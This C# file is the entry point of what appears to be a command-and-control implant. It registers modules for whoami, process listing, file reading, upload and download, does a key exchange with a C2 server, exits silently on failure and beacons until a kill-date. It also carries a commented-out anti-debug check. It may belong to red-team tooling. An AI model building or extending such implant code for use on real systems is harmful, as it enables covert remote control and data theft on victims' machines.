using System;
using Agent.Core;
using Agent.NativeModules;

namespace Agent
{
    /// <summary>
    /// Agent entry point. Initializes the controller, registers native modules,
    /// and starts the beacon loop.
    /// </summary>
    class Program
    {
        static void Main(string[] args)
        {
            // Optional anti-debug checks (configurable at build)
            // if (Kernel32.IsDebuggerPresent()) return;

            var controller = new AgentController();

            // Register Phase 1 native modules
            controller.RegisterModule(new WhoAmIModule());
            controller.RegisterModule(new ProcessListModule());
            controller.RegisterModule(new FileListModule());
            controller.RegisterModule(new FileCatModule());
            controller.RegisterModule(new FileUploadModule());
            controller.RegisterModule(new FileDownloadModule());

            // Initialize (key exchange, sysinfo collection)
            if (!controller.Initialize())
            {
                // Failed to contact C2 — exit silently
                return;
            }

            // Main beacon loop (blocks until exit/kill-date)
            controller.Run();
        }
    }
}
